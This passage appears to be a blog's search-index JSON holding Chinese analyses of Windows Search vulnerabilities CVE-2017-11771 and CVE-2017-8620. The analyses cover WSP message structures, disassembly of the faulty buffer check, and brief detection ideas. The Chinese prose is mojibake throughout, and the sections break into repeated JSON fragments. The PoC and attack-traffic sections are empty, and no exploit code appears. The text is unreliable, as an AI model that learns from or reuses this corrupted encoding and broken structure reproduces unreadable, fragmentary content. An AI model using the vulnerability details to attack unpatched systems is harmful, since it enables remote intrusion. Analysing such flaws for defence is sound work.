è¾“æ–¹å‘åˆ¤å®šå…·ä½“ä»£è¡¨å“ªç§ç±»å‹ã€‚å¸¦\"In\"å­—ç¬¦çš„æ˜¯ä»clientåˆ°serverï¼Œå¸¦\"Out\"å­—ç¬¦çš„æ˜¯ä»serveråˆ°clientï¼‰ï¼› _statuså­—æ®µè¡¨æ˜æ‰€è¯·æ±‚æ“ä½œçš„çŠ¶æ€ï¼Œç”±æœåŠ¡å™¨å¡«å……ï¼› _ulChecksumåŒ…å«ä»_ulReserved2å­—æ®µåé¢å¼€å§‹çš„æ¶ˆæ¯çš„æ ¡éªŒå’Œï¼› _ulReserved2å­—æ®µé™¤äº†åç»­çš„æ¶ˆæ¯ä¸ºCPMGetRowsInä¹‹å¤–ï¼Œéƒ½å¿…é¡»è®¾ç½®ä¸º0ã€‚ ä¸æœ¬æ¼æ´ç›¸å…³çš„æ˜¯CPMGetRowsInæ¶ˆæ¯ã€‚è¯¥æ¶ˆæ¯ä¸»è¦ç”¨äºä»æŸ¥è¯¢ä¸­è¯·æ±‚æ•°æ®è¡Œ(row)ï¼Œå…¶è¯¦ç»†æ ¼å¼å¦‚ä¸‹ï¼š Offset Size (bytes) Field ------------------------------------------ 0x00 0x4 hCursor 0x04 0x4 cRowsToTransfer 0x08 0x4 cbRowWidth 0x0c 0x4 cbSeek 0x10 0x4 cbReserved 0x14 0x4 cbReadBuffer 0x18 0x4 ulClientBase 0x1c 0x4 fBwdFetch 0x20 0x4 eType 0x24 0x4 chapt 0x28 variable SeekDescription cRowsToTransferå­—æ®µæŒ‡å®šCPMGetRowsOutæ¶ˆæ¯ä¸­åŒ…æ‹¬å¤šå°‘rowï¼ŒcbRowWidthå­—æ®µè¡¨ç¤ºrowçš„é•¿åº¦ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ï¼ŒcbReservedå­—æ®µæŒ‡å®šç»“æœåœ¨CPMGetRowsOutæ¶ˆæ¯ä¸­çš„åç§»é‡(ä¸cbSeekå­—æ®µç›¸åŠ ç„¶åè¿›è¡Œè®¡ç®—åç§»)ï¼ŒcbReadBufferå­—æ®µæŒ‡å®š CPMGetRowsOutæ¶ˆæ¯ä¸­çš„æ•°æ®å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ï¼Œè¯¥å­—æ®µå¿…é¡»è®¾ç½®ä¸º_cbRowWidthå€¼çš„æœ€å¤§å€¼æˆ–_cRowsToTransferå€¼çš„1000å€ï¼Œå››èˆäº”å…¥åˆ°æœ€æ¥è¿‘çš„512å­—èŠ‚å€æ•°ã€‚ è¯¥å€¼ä¸å¾—è¶…è¿‡0x00004000ã€‚ ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:3:2","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"3. è¯¦ç»†åˆ†æ serveræ¥æ”¶åˆ°CPMGetRowsInæ¶ˆæ¯åï¼Œé¦–å…ˆæ£€æŸ¥cbReservedçš„å€¼æ˜¯å¦å°äºcbReadBufferã€‚ç„¶åè°ƒç”¨CFixedVarBufferAllocator::CFixedVarBufferAllocator()æ¥åˆå§‹åŒ–bufferï¼Œè¯¥bufferä¸­åº”è¯¥æœ‰ç›¸åº”çš„CPMGetRowsOutæ¶ˆæ¯ã€‚è¯¥å‡½æ•°ä¼šä½¿ç”¨ä¸‹é¢çš„æ–¹å¼å¯¹ç»“æœæ•°æ®è¿›è¡Œåˆå§‹ä½ç½®å’Œç»“æŸä½ç½®çš„è®¡ç®—ï¼š resultDataStart = buffer + cbReversed resultDataEnd = buffer + cbReadBuffer å¦‚æœè®¡ç®—å‡ºçš„resultDataEndä¸æ˜¯8å­—èŠ‚å¯¹é½çš„ï¼Œåˆ™å‡½æ•°ä¸€æ¬¡ä»resultDataEndå‡å»ä¸€ä¸ªå­—èŠ‚ï¼Œç›´åˆ°å¯¹é½ä¸ºæ­¢ã€‚ ä½†æ˜¯ï¼Œåœ¨è¿”å›åˆ†é…çš„bufferå‰ï¼Œå‡½æ•°æ²¡æœ‰å¯¹resultDataEndæ˜¯å¦å¤§äºç­‰äºresultDataStartè¿›è¡ŒéªŒè¯ï¼Œç›´æ¥è°ƒç”¨äº†CFixedVarBufferAllocator::CFixedVarBufferAllocator()å‡½æ•°è¿›è¡Œåˆå§‹åŒ–bufferçš„chunkåˆ†é…ã€‚AllocFixed()å‡½æ•°ä½¿ç”¨ä¸‹é¢çš„æ–¹å¼æ¥ç¡®è®¤bufferä¸­æ˜¯å¦æœ‰è¶³å¤Ÿç©ºé—´ï¼š resultDataEnd - resultDataStart \u003c cbRowWidth å› ä¸ºCFixedvarBufferAllocator()æ²¡æœ‰è¿›è¡Œä¸¤ä¸ªå­—æ®µå¤§å°çš„æ¯”è¾ƒï¼Œæ‰€ä»¥æœ‰å¯èƒ½ä¼šå‡ºç°resultDataEndå°äºresultDataStartçš„æƒ…å†µï¼Œè¿™æ ·å½“ä¸¤ä¸ªå­—æ®µè¿›è¡Œå‡æ³•è¿ç®—çš„æ—¶å€™å°±ä¼šé€ æˆæº¢å‡ºã€‚ç„¶åä¼šè°ƒç”¨AllocFixed()å‡½æ•°è¿›è¡Œå†…å­˜åˆ†é…ï¼Œä½†æ˜¯æ­¤æ—¶çš„bufferçš„offsetæœ‰å¯èƒ½æ˜¯é”™è¯¯çš„ã€‚å½“rowè¢«å¤åˆ¶åˆ°åˆ†é…çš„chunkæ—¶ï¼Œæ•°æ®ä¼šè¢«å†™åˆ°bufferçš„æœ«å°¾ï¼Œæœ€ç»ˆå¯¼è‡´ä¸€ä¸ªå †æº¢å‡ºã€‚ ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:3:3","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"4. æºç åˆ†æ # CRequestServer::DoGetRows(): .text:62A6912A mov eax, [esi+20h] ; cbReserved .text:62A6912D mov edi, [esi+24h] ; cbReadBuffer [......] .text:62A6915F cmp eax, edi .text:62A69161 jb loc_62AA21B3 ; ensure cbReserved \u003c cbReadBuffer [......] .text:62A691DE push [ebp+cbReserved] ; cbReserved .text:62A691E1 lea ecx, [ebp+fixedVarBuffer] ; this .text:62A691E7 push ebx ; cbRowWidth .text:62A691E8 push edi ; cbReadBuffer .text:62A691E9 push [ebp+clientBase] ; clientBase .text:62A691EC push esi ; base of message .text:62A691ED call ??0CFixedVarBuff... ; CFixedVarBufferAllocator() # CFixedVarBufferAllocator::CFixedVarBufferAllocator(): .text:62A68413 mov ecx, [ebp+msgBase_arg0] .text:62A68416 push ebx .text:62A68417 mov dword ptr [eax+8], offset ??_7PFixedA... .text:62A6841E push esi .text:62A6841F mov esi, [ebp+cbReserved_arg10] .text:62A68422 mov [eax+14h], edx .text:62A68425 lea edx, [esi+ecx] ; resultDataStart .text:62A68428 mov [eax+18h], edx .text:62A6842B mov edx, [ebp+cbReadBuffer_arg8] .text:62A6842E xor ebx, ebx .text:62A68430 add edx, ecx ; resultDataEnd .text:62A68432 test ecx, ecx .text:62A68434 push edi .text:62A68435 mov edi, [ebp+cbRowWidth_argC] .text:62A68438 setnz bl .text:62A6843B mov [eax+20h], edi .text:62A6843E pop edi .text:62A6843F mov [eax+24h], esi .text:62A68442 pop esi .text:62A68443 mov dword ptr [eax], offset ??_7CFixedVar... .text:62A68449 mov dword ptr [eax+8], offset ??_7CFixedV... .text:62A68450 mov [eax+4], ebx .text:62A68453 mov [eax+0Ch], ecx .text:62A68456 mov [eax+10h], ecx .text:62A68459 mov [eax+1Ch], edx .text:62A6845C pop ebx .text:62A6845D test dl, 7 ; check if resultDataEnd is 8-byte aligned .text:62A68460 jnz loc_62AA20DA .text:62A68466 pop ebp ; fails to validate resultDataEnd \u003e= resultDataStart .text:62A68467 retn 14h [......] .text:62AA20DA dec dword ptr [eax+1Ch] ; subtract resultDataEnd .text:62AA20DD test byte ptr [eax+1Ch], 7 ; check alignment .text:62AA20E1 jz loc_62A68466 .text:62AA20E7 jmp short loc_62AA20DA # CFixedVarBufferAllocator::AllocFixed(): .text:62A745B0 mov edi, edi .text:62A745B2 push ebp .text:62A745B3 mov ebp, esp .text:62A745B5 mov eax, [ecx+10h] .text:62A745B8 mov edx, [ecx+18h] .text:62A745BB sub esp, 20h .text:62A745BE push esi .text:62A745BF mov esi, [ecx+14h] .text:62A745C2 sub esi, eax ; resultDataEnd - resultDataStart .text:62A745C4 cmp edx, esi ; compare above difference to cbRowWidth .text:62A745C6 ja loc_62AA20E9 .text:62A745CC add edx, eax ; add cbRowWidth to resultDataStart .text:62A745CE mov [ecx+10h], edx .text:62A745D1 pop esi .text:62A745D2 leave .text:62A745D3 retn ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:3:4","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"5. æ”»å‡»æµé‡ SMB1: SMB2: ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:3:5","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"6. PoCåˆ†æ é¦–å…ˆè¿›è¡Œäº†å‰æœŸçš„éªŒè¯å·¥ä½œï¼Œä¾‹å¦‚åˆ›å»ºå‘½åç®¡é“ï¼Œå»ºç«‹æŸ¥è¯¢è¿æ¥ï¼Œåˆ¤æ–­æ–‡ä»¶å¤¹æ˜¯å¦å¤„äºå…±äº«è®¿é—®ã€‚æŒ‰ç…§æŸ¥è¯¢æµç¨‹ä¾æ¬¡è¿›è¡Œæ•°æ®å‘é€ï¼Œæ¥åˆ°GetRowsInæ¶ˆæ¯ï¼š ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:3:6","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"å››ã€æ¼æ´æ£€æµ‹å’Œé˜²å¾¡ ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:4:0","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"1. æ¼æ´æ£€æµ‹ æš‚æ— ã€‚ ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:4:1","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"2. æ¼æ´é˜²å¾¡ 1. æ£€æµ‹æ€è·¯ é¦–å…ˆç›‘æ§é€šè¿‡SMBå»ºç«‹MsFtewdså‘½åç®¡é“çš„æ“ä½œï¼Œç„¶åä½¿ç”¨byte_mathæ£€æµ‹å‡ºç°æ¼æ´çš„å­—æ®µ 2. å¯èƒ½å­˜åœ¨çš„é£é™© SMBandxå‘½ä»¤æœ‰é“¾å¼ç»“æ„ï¼Œå¯ä»¥åµŒå¥—ï¼Œå®¹æ˜“äº§ç”Ÿç»•è¿‡ã€‚ ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:4:2","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"CVE-2017-8620  Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/","tags":["æ¼æ´"],"title":"CVE-2017-8620  Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"CVE-2017-8620 Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:0:0","tags":["æ¼æ´"],"title":"CVE-2017-8620  Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"ä¸€ã€æ¼æ´ä¿¡æ¯ ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:1:0","tags":["æ¼æ´"],"title":"CVE-2017-8620  Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"1. æ¼æ´ç®€è¿° æ¼æ´åç§°ï¼šWindows Search Remote Code Execution Vulnerability æ¼æ´ç¼–å·ï¼šCVE-2017-8620ï¼›Bugtraq IDï¼š100034 æ¼æ´ç±»å‹ï¼šRemote Code Execution ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:1:1","tags":["æ¼æ´"],"title":"CVE-2017-8620  Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"2. ç»„ä»¶æ¦‚è¿° Windowsæœç´¢æ˜¯ä¸€ä¸ªæ¡Œé¢æœç´¢å¹³å°ï¼Œå…·æœ‰é’ˆå¯¹å¤§å¤šæ•°å¸¸è§æ–‡ä»¶ç±»å‹å’Œæ•°æ®ç±»å‹çš„å³æ—¶æœç´¢åŠŸèƒ½ã€‚ å®ƒçš„ä¸»è¦ç»„ä»¶æ˜¯WSearch Windows Serviceï¼Œå®ƒè´Ÿè´£ç´¢å¼•ï¼Œç»„ç»‡å’Œæå–æœ‰å…³æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„ä¿¡æ¯ã€‚ æ­¤å¤–ï¼Œå®ƒå®ç°äº†é€šç”¨æœç´¢æœåŠ¡ï¼ˆGSSï¼‰ï¼Œå®ƒæ˜¯å‘æœç´¢æŸ¥è¯¢æä¾›ç»“æœæ‰€éœ€çš„åç«¯åŠŸèƒ½ã€‚ å®¢æˆ·ç«¯ä½¿ç”¨Windowsæœç´¢åè®®ï¼ˆWSPï¼‰å‘æ‰˜ç®¡GSSçš„æœåŠ¡å™¨å‘å‡ºæŸ¥è¯¢ã€‚ WSPä¾é åä¸ºç®¡é“åè®®çš„æœåŠ¡å™¨æ¶ˆæ¯å—ï¼ˆSMBï¼‰è¿›è¡Œæ¶ˆæ¯ä¼ è¾“å’Œèº«ä»½éªŒè¯ã€‚ Microsoft Windowsçš„æ‰€æœ‰ç‰ˆæœ¬å‡é™„å¸¦æœåŠ¡å™¨æ¶ˆæ¯å—ï¼ˆSMBï¼‰åè®®çš„å®ç°ã€‚ SMBæ˜¯æœ¬æœºWindowsç½‘ç»œæ¡†æ¶ï¼Œæ”¯æŒæ–‡ä»¶å…±äº«ï¼Œç½‘ç»œæ‰“å°ï¼Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨å’Œå…¶ä»–åŠŸèƒ½ã€‚åœ¨Windowsç³»ç»Ÿä¸Šï¼ŒSMBåè®®é€šè¿‡é™„åŠ çš„å®‰å…¨æ€§ï¼Œæ–‡ä»¶å’Œç£ç›˜ç®¡ç†æ”¯æŒæ‰©å±•äº†CIFSåè®®ã€‚ é€šè¿‡å„ç§SMBå‘½ä»¤å’Œå­å‘½ä»¤ç±»å‹æä¾›è¿™äº›åŠŸèƒ½ã€‚ ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:1:2","tags":["æ¼æ´"],"title":"CVE-2017-8620  Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"3. æ¼æ´æ¦‚è¿° Windowsæœç´¢å¤„ç†å†…å­˜ä¸­çš„å¯¹è±¡æ—¶ï¼Œå­˜åœ¨è¿œç¨‹æ‰§è¡Œä»£ç æ¼æ´ï¼ŒæˆåŠŸåˆ©ç”¨æ­¤æ¼æ´çš„æ”»å‡»è€…å¯ä»¥æ§åˆ¶å—å½±å“çš„ç³»ç»Ÿã€‚è™½ç„¶æ¼æ´ä¸SMBåè®®æœ¬èº«æ— å…³ï¼Œä½†æ”»å‡»è€…å¯SMBç›®æ ‡ä½œä¸ºæ”»å‡»åª’ä»‹ï¼Œå› æ­¤è¯¥æ¼æ´é¢ä¸´ç€ä¸Wannacryç±»ä¼¼çš„å¤§è§„æ¨¡åˆ©ç”¨é£é™©ã€‚CNVDå¯¹è¯¥æ¼æ´çš„æŠ€æœ¯è¯„çº§ä¸ºâ€œé«˜å±â€ã€‚ ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:1:3","tags":["æ¼æ´"],"title":"CVE-2017-8620  Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"4. æ¼æ´å½±å“ç‰ˆæœ¬ â€¢ Microsoft Windows 10 for 32-bit Systems â€¢ Microsoft Windows 10 for x64-based Systems â€¢ Microsoft Windows 2012 R2 â€¢ Microsoft Windows 8.1 for 32-bit Systems â€¢ Microsoft Windows 8.1 for x64-based Systems â€¢ Microsoft Windows RT 8.1 â€¢ Microsoft Windows Windows 7 for 32-bit Systems Service Pack 1 â€¢ Microsoft Windows Windows 7 for x64-based Systems Service Pack 1 â€¢ Microsoft Windows Server 2008 for 32-bit Systems SP 2 (Server Core) â€¢ Microsoft Windows Server 2008 for 32-bit Systems SP2 â€¢ Microsoft Windows Server 2008 for Itanium-based Systems Service Pack 2 â€¢ Microsoft Windows Server 2008 for x64-based systems â€¢ Microsoft Windows Server 2008 R2 for Itanium-based Systems Service Pack 1 â€¢ Microsoft Windows Server 2012 R2 â€¢ Microsoft Windows Server 2012 R2 (Server Core) â€¢ Microsoft Windows Server 2016 â€¢ Microsoft Windows Server 2016 Server Core ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:1:4","tags":["æ¼æ´"],"title":"CVE-2017-8620  Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"5. è§£å†³æ–¹æ¡ˆ è·å–è¯¥æ¼æ´è¡¥ä¸ï¼Œåœ°å€ï¼šhttps://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8620 ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:1:5","tags":["æ¼æ´"],"title":"CVE-2017-8620  Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"äºŒã€æ¼æ´å¤ç° ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:2:0","tags":["æ¼æ´"],"title":"CVE-2017-8620  Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"ä¸‰ã€æ¼æ´åˆ†æ ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:3:0","tags":["æ¼æ´"],"title":"CVE-2017-8620  Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"1. æ¼æ´åŸºæœ¬ä¿¡æ¯ æ¼æ´æ–‡ä»¶ï¼štquery.dll æ¼æ´å‡½æ•°ï¼šCRegXpr::CRegXpr() æ¼æ´å¯¹è±¡ï¼šä¸€ä¸ªCPropertyRestrictionç»“æ„ï¼Œå…¶prvalå…·æœ‰ä¸VT_LPWSTRçš„vTypeæ··æ·†çš„VT_LPWSTRä»¥å¤–çš„vTypeã€‚ ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:3:1","tags":["æ¼æ´"],"title":"CVE-2017-8620  Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"2. èƒŒæ™¯çŸ¥è¯† å¤‡æ³¨ï¼šæ­¤å¤„ç•¥å»SMBç›¸å…³ä»‹ç»ï¼Œæ¼æ´è‡ªèº«ä¸SMBå…³ç³»ä¸å¤§ï¼ŒSMBåªæ˜¯ä½œä¸ºWSPä¼ è¾“çš„å·¥å…·åè®®ï¼Œä½¿ç”¨çš„pipeåç§°ä¸ºMsFteWdsã€‚ Windows Search Protocol(WSP) ä½¿ç”¨WSPçš„æœ€å°æœç´¢æŸ¥è¯¢å…¶æµç¨‹å¤§æ¦‚å¦‚ä¸‹ï¼š [ Client ] --------------------\u003e [ Server ] - CPMConnectIn [ Client ] \u003c-------------------- [ Server ] - CPMConnectOut [ Client ] --------------------\u003e [ Server ] - CPMCreateQueryIn [ Client ] \u003c-------------------- [ Server ] - CPMCreateQueryOut [ Client ] --------------------\u003e [ Server ] - CPMSetBindingsIn request [ Client ] \u003c-------------------- [ Server ] - CPMSetBindingsIn response [ Client ] --------------------\u003e [ Server ] - CPMGetRowsIn [ Client ] \u003c-------------------- [ Server ] - CPMGetRowsOut [ Client ] --------------------\u003e [ Server ] - CPMGetFreeCursorIn [ Client ] \u003c-------------------- [ Server ] - CPMGetFreeCursorOut [ Client ] --------------------\u003e [ Server ] - CPMDisconnect CPMConnectInæ¶ˆæ¯å¼€å§‹äºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ä¼šè¯ï¼ŒCPMCreateQueryInåŒ…å«æŸ¥è¯¢æ¡ä»¶å¹¶åˆ›å»ºæ–°æŸ¥è¯¢ï¼ŒCPMSetBindingsInæŒ‡å®šå¦‚ä½•åœ¨CPMGetRowsOutä¸­æ„å»ºæœç´¢ç»“æœï¼ŒCPMGetRowsInä»æœåŠ¡å™¨è¿”å›çš„æŸ¥è¯¢ç»“æœä¸­è¯·æ±‚æ•°æ®ã€‚ æ‰€æœ‰çš„WSPæ¶ˆæ¯ä»¥ä¸€ä¸ª16å­—èŠ‚çš„å¤´éƒ¨å¼€å§‹ï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š Offset Size (bytes) Field -------------------------------------------- 0x00 0x4 _msg 0x04 0x4 _status 0x08 0x4 _ulChecksum 0x0c 0x4 _ulReserved2 _msgå­—æ®µæ ‡è¯†æ ‡å¤´éƒ¨åé¢çš„æ¶ˆæ¯ç±»å‹ï¼ˆæœ‰çš„ä¸€ä¸ªvalueè¡¨ç¤ºä¸¤ç§ç±»å‹ï¼Œæ­¤æ—¶è¦æ ¹æ®æ•°æ®æµçš„ä¼ è¾“æ–¹å‘åˆ¤å®šå…·ä½“ä»£è¡¨å“ªç§ç±»å‹ã€‚å¸¦\"In\"å­—ç¬¦çš„æ˜¯ä»clientåˆ°serverï¼Œå¸¦\"Out\"å­—ç¬¦çš„æ˜¯ä»serveråˆ°clientï¼‰ï¼› _statuså­—æ®µè¡¨æ˜æ‰€è¯·æ±‚æ“ä½œçš„çŠ¶æ€ï¼Œç”±æœåŠ¡å™¨å¡«å……ï¼› _ulChecksumåŒ…å«ä»_ulReserved2å­—æ®µåé¢å¼€å§‹çš„æ¶ˆæ¯çš„æ ¡éªŒå’Œï¼› _ulReserved2å­—æ®µé™¤äº†åç»­çš„æ¶ˆæ¯ä¸ºCPMGetRowsInä¹‹å¤–ï¼Œéƒ½å¿…é¡»è®¾ç½®ä¸º0ã€‚ è·Ÿæœ¬æ¼æ´ç›¸å…³çš„æ˜¯CPMCreateQueryInæ¶ˆæ¯ï¼Œ æ­¤æ¶ˆæ¯åˆ›å»ºä¸€ä¸ªæ–°çš„æœç´¢æŸ¥è¯¢ï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š Offset Size (bytes) Field -------------------------------------------------------------------- 0x00 0x4 Size 0x04 0x1 CColumnSetPresent 0x05 0x3 paddingCColumnSet 0x08 var (w) ColumnSet 0x08 + w 0x1 CRestrictionPresent 0x09 + w var (x) RestrictionArray 0x09 + w + x 0x1 CSortSetPresent 0x0a + w + x 0x3 paddingCCortSet 0x0d + w + x var (y) SortSet 0x0d + w + x + y 0x1 CCategorizationSetPresent 0x0e + w + x + y 0x3 paddingCCategorizationSet 0x11 + w + x + y var (z) CCategorizationSet 0x11 + w + x + y + z 0x14 RowSetProperties 0x25 + w + x + y + z var (m) PidMapper 0x25 + w + x + y + z + m var (n) GroupArray 0x25 + w + x + y + z + m + n 0x4 Lcid ä»ä¸Šé¢çš„ç»“æ„ä¸­å¯ä»¥çœ‹å‡ºï¼Œæœ‰å¾ˆå¤šå­—æ®µæ•°å€¼å¤§å°ä¸æ˜¯å›ºå®šçš„ï¼Œè¿™å¯¹åç»­çš„æµé‡ç›‘æµ‹é€ æˆå¾ˆå¤§å›°éš¾ã€‚ åœ¨ä¸Šé¢çš„ç»“æ„ä¸­ï¼Œéœ€è¦é‡ç‚¹å…³æ³¨çš„å­—æ®µæ˜¯CRestrictionPresentå’ŒRestrictionArrayã€‚ å‰è€…æ ‡è¯†äº†RestrictionArrayå­—æ®µæ˜¯å¦å­˜åœ¨ï¼ˆCRestrictionPresentä¸º0æ—¶ï¼ŒRestrictionArrayå­—æ®µä¸èƒ½å­˜åœ¨ï¼›CRestrictionPresentå­—æ®µä¸ºé0æ—¶ï¼ŒRestrictionArrayå­—æ®µå¿…é¡»å­˜åœ¨ï¼‰ï¼Œåè€…åŒ…å«æè¿°æŸ¥è¯¢å‘½ä»¤æ ‘çš„CRestrictionArrayç»“æ„ã€‚ å‘½ä»¤æ ‘æ˜¯ä¸ºæœç´¢æŸ¥è¯¢æŒ‡å®šçš„é™åˆ¶æ¡ä»¶å’Œæ’åºé¡ºåºçš„ç»„åˆã€‚ CRestrictionArrayçš„è¯¦ç»†ç»“æ„å¦‚ä¸‹ï¼š Offset Size(bytes) Field ------------------------------------------- 0x00 0x1 count 0x01 0x1 isPresent 0x02 0x3 padding 0x05 var Restriction countå­—æ®µè¡¨æ˜Restrictionå­—æ®µä¸­åŒ…å«CRestrictionçš„æ•°é‡ï¼Œè¯¥å­—æ®µå¿…é¡»è®¾ç½®ä¸º0x01ï¼› isPresentå­—æ®µæ ‡è¯†Restrictionå­—æ®µæ˜¯å¦å­˜åœ¨æ˜¯å¦åŒ…å«CRestrictionç»“æ„ï¼Œå€¼ä¸º0ï¼ˆçœç•¥ï¼‰æˆ–1ï¼ˆä¸çœç•¥ï¼‰ï¼› CRestrictionæŒ‡ç¤ºç”¨äºå‘½ä»¤æ ‘èŠ‚ç‚¹çš„é™åˆ¶ç±»å‹ï¼Œç±»å‹å†³å®šäº†åœ¨è¯¥ç»“æ„çš„\"Restriction\"å­—æ®µä¸­æ‰¾åˆ°çš„å†…å®¹ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š Offset Size(bytes) Field ------------------------------------------ 0x00 0x4 ulType 0x04 0x4 Weight 0x08 var Restriction ulTypeæ ‡è¯†Restrictionå­—æ®µä¸­å­˜åœ¨çš„é™åˆ¶ç»“æ„çš„ç±»å‹ã€‚ æ­¤æ¼æ´æ¶‰åŠå…·æœ‰æŒ‡å®šCPropertyRestrictionçš„ulTypeä¸ºRTProperty(0x5)çš„CRestrictionsã€‚ æŸäº›CRestrictionç±»å‹å¯ä»¥åŒ…å«åµŒå¥—çš„CRestrictionsï¼Œå½¢æˆä¸€ä¸ªé™åˆ¶æ ‘ã€‚å› æ­¤ï¼ŒCPropertyRestrictionå¯ä»¥åµŒå…¥ä»¥ä¸‹ä»»ä½•é™åˆ¶æ¡ä»¶ä¸­ï¼š RTAnd (0x1), Restriction contains a CNodeRestriction structure RTOr (0x2), Restriction contains a CNodeRestriction structure RTNot (0x3), Restriction contains a CRestriction structure RTProximity (0x6), Restriction contains a CNodeRestriction structure RTVector (0x7), Restriction contains a CVectorRestriction structure RTCoerce_Add (0xA), Restriction contains a CCoercionRestriction structure RTCoerce_Multiply (0xB), Restriction contains a CCoercionRestriction structure RTCoerce_Absolute (0xC), Restriction contains a CCoercionRestriction structure RTPhrase (0x00FFFFFD), Restriction contains a CNodeRestriction structure ä¸Šè¿°åˆ—è¡¨ä¸­çš„é™åˆ¶å…·æœ‰ä»¥ä¸‹ç»“æ„ï¼š CNodeRestriction: Offset Sizeï¼ˆbytes) Field ---------------------------------------------------------------- 0x00 0x4 cNode (number of structures in paNode) 0x04 var paNode (array of CRestriction structures) CVectorRestriction: Offset Size (bytes) Field ------------------------------------------------------------ 0x00 var (n) pres (CNodeRestriction structure) 0x00 ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:3:2","tags":["æ¼æ´"],"title":"CVE-2017-8620  Windows Searchè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"3. è¯¦ç»†åˆ†æ 